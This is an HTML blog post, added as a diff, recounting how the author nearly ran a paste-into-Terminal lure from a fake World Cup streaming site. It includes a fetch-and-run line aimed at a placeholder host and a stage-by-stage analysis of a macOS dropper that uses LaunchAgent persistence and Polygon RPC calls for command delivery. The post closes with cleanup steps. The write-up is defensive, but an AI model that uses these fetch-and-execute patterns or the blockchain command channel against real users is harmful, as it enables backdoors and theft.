@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="../../assets/js/theme-init.js"></script>
+  <meta name="description" content="Almost Got Hacked! — Rishabh Kumar">
+  <title>Almost Got Hacked! — Rishabh Kumar</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,500;0,600;1,400&family=Newsreader:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <script data-goatcounter="https://rishabh0098.goatcounter.com/count"
+          async src="//gc.zgo.at/count.js"></script>
+</head>
+<body>
+  <div class="page blog-post-page">
+    <main>
+      <div class="container">
+        <div class="site-title-row">
+          <h1 class="site-title"><a href="../../index.html">Rishabh Kumar</a></h1>
+          <button type="button" class="theme-toggle" role="switch" aria-checked="false" aria-label="Switch to dark mode">
+            <span class="theme-toggle-track">
+              <span class="theme-toggle-thumb"></span>
+            </span>
+          </button>
+        </div>
+        <a href="../index.html" class="back-link">← Back to blog</a>
+
+        <header class="blog-post-header">
+          <h1 class="blog-post-title">Almost Got Hacked!</h1>
+          <p class="blog-post-date">June 24, 2026</p>
+        </header>
+
+        <article class="blog-post-content">
+          <p>
+            I almost got hacked today. I was looking for a free online stream of the FIFA World Cup 2026,
+            found a shady website, and did exactly what it told me to do. In my defense, kickoff was soon.
+          </p>
+
+          <h2>How it started</h2>
+          <p>The site claimed to stream the World Cup for free and walked me through four steps:</p>
+          <ol>
+            <li>Press <code>cmd</code> + <code>space</code></li>
+            <li>Type <code>terminal</code> and press <code>enter</code></li>
+            <li>Press <code>cmd</code> + <code>V</code> to paste (no mention of when anything was copied to my clipboard)</li>
+            <li>Press <code>enter</code></li>
+          </ol>
+          <p>
+            Any rational person would have stopped. I didn't — I was too eager to watch the match to think clearly.
+          </p>
+
+          <h2>What I pasted</h2>
+          <p>The clipboard held something like:</p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">Bash</span>
+              <button type="button" class="code-block-copy" aria-label="Copy code">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+              </button>
+            </div>
+            <pre class="code-block-body"><code>bash "echo "&lt;some short base64 string&gt;" | base64 -d | bash"</code></pre>
+          </div>
+          <p>
+            I pasted it and pressed <code>enter</code>. macOS immediately flagged it as malware and blocked it.
+            No harm was done to my system.
+          </p>
+          <p>
+            That's when I learned about <strong>XProtect</strong> — Apple's built-in anti-malware system.
+            It keeps a signature list of known malicious scripts and blocks matches before they run.
+            This one was already in the database, which is the only reason nothing bad happened.
+          </p>
+
+          <h2>Going down the rabbit hole</h2>
+          <p>By then I had completely forgotten about the World Cup.</p>
+          <p>
+            I ran <code>history</code> to recover the command. Nothing — the script never executed,
+            so there was nothing to find.
+          </p>
+          <p>
+            Decoding the base64 manually gave me something like this (the link is fake here,
+            but it's real in the actual script):
+          </p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">Bash</span>
+              <button type="button" class="code-block-copy" aria-label="Copy code">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+              </button>
+            </div>
+            <pre class="code-block-body"><code>curl -fsSL https://example.com/malware.sh</code></pre>
+          </div>
+          <p>I fetched the script without executing it:</p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">Bash</span>
+              <button type="button" class="code-block-copy" aria-label="Copy code">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+              </button>
+            </div>
+            <pre class="code-block-body"><code>curl -fsSL https://example.com/malware.sh | cat</code></pre>
+          </div>
+          <p>
+            The output was an <code>osascript</code> command wrapping another large base64 payload.
+            Claude declined to analyze it, citing security policy. ChatGPT did. Here's what it found.
+          </p>
+
+          <h2>What the malware does</h2>
+          <p>
+            A multi-stage macOS dropper: AppleScript, persistent LaunchAgent, and the Polygon blockchain
+            as a command-delivery channel.
+          </p>
+          <p>
+            <strong>Stage 1 — Persistence.</strong> Creates
+            <code>~/Library/LaunchAgents/com.ifipbqmfnnywqguz.plist</code> and registers it with
+            <code>launchctl</code>. The plist sets <code>RunAtLoad</code> (runs at login) and
+            <code>KeepAlive</code> (relaunches if killed).
+          </p>
+          <p>
+            <strong>Stage 2 — Obfuscated payload.</strong> The LaunchAgent runs
+            <code>echo '&lt;base64&gt;' | base64 -d | osascript</code>. The AppleScript rebuilds strings
+            character by character — <code>(character id 112) &amp; (ASCII character 111) &amp; ...</code>
+            — to evade static analysis.
+          </p>
+          <p>
+            <strong>Stage 3 — Blockchain C2.</strong> The script hits Polygon RPC endpoints
+            (<code>polygon.drpc.org</code>, <code>polygon.publicnode.com</code>,
+            <code>polygon-mainnet.gateway.tatum.io</code>, <code>tenderly.rpc.polygon.community</code>),
+            trying each in sequence. It sends a JSON-RPC <code>eth_call</code> to a hard-coded smart contract,
+            extracts the hex result (<code>0x...</code>), decodes it to text, and pipes it into
+            <code>osascript</code>:
+          </p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">Text</span>
+              <button type="button" class="code-block-copy" aria-label="Copy code">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+              </button>
+            </div>
+            <pre class="code-block-body"><code>Polygon RPC → eth_call → hex response → decode → osascript → execute</code></pre>
+          </div>
+          <p>
+            The attacker can change behavior anytime by updating what the contract returns — no traditional
+            C2 server, and the on-disk payload never needs updating.
+          </p>
+          <p>
+            <strong>Verdict:</strong> persistent macOS backdoor with remote code execution, using Polygon RPC
+            as command transport. High severity. The blockchain layer delivers attacker commands, not just
+            wallet reconnaissance.
+          </p>
+
+          <h2>If you ran this script</h2>
+          <p>Look for these:</p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">Bash</span>
+              <button type="button" class="code-block-copy" aria-label="Copy code">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+              </button>
+            </div>
+            <pre class="code-block-body"><code>ls ~/Library/LaunchAgents/com.ifipbqmfnnywqguz.plist
+ls ~/Library/ifipbqmfnnywqguz
+launchctl list | grep ifipbqmfnnywqguz</code></pre>
+          </div>
+          <p>If you find them, do this:</p>
+          <div class="code-block">
+            <div class="code-block-header">
+              <span class="code-block-lang">Bash</span>
+              <button type="button" class="code-block-copy" aria-label="Copy code">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+              </button>
+            </div>
+            <pre class="code-block-body"><code>launchctl unload ~/Library/LaunchAgents/com.ifipbqmfnnywqguz.plist
+rm ~/Library/LaunchAgents/com.ifipbqmfnnywqguz.plist</code></pre>
+          </div>
+          <p>Also check for similarly named random directories under <code>~/Library/</code>.</p>
+
+          <h2>What I took away</h2>
+          <p>
+            Simple social engineering — urgency plus a plausible streaming site — almost worked on someone
+            who knows what a terminal is.
+          </p>
+          <ul>
+            <li>Don't paste commands into Terminal because a website told you to.</li>
+            <li><code>base64 -d | bash</code> is almost never something a legitimate site needs you to run.</li>
+            <li>XProtect helped, but it only covers known signatures. New variants can slip through.</li>
+          </ul>
+          <p>
+            Glad the script was blocked, glad I understood what it would have done, and glad I can share this
+            from an uncompromised laptop. Shoutout to Apple for protecting me from myself, and to ChatGPT
+            for analyzing the script.
+          </p>
+          <p>Now I'm going to watch the World Cup the legal way.</p>
+          <p>Until next time!</p>
+        </article>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <div class="container">
+        <p>© 2026 Rishabh Kumar vibecoded with Cursor | Last updated: June 2026</p>
+      </div>
+    </footer>
+  </div>
+  <script src="../../assets/js/theme.js"></script>
+  <script src="../../assets/js/code-blocks.js"></script>
+</body>
+</html>
